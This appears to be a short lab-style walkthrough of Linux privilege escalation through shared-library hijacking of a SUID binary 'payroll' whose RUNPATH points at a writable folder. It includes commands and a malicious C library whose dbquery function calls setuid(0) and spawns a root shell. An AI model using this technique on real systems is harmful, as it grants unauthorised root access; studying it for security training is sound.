#### Find a SUID binary nad checking library
```shell
ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
#### There is a non standard library (libshared.so), let's hijack it
As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.
```shell
readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
We see that we can put a library in /development
Let's find a symbol needed by the binary.
Modify the library
```shell
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We see that `dbquery` is needed function for the binary let's make a malicious one.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

```shell
gcc src.c -fPIC -shared -o /development/libshared.so

./payroll
```

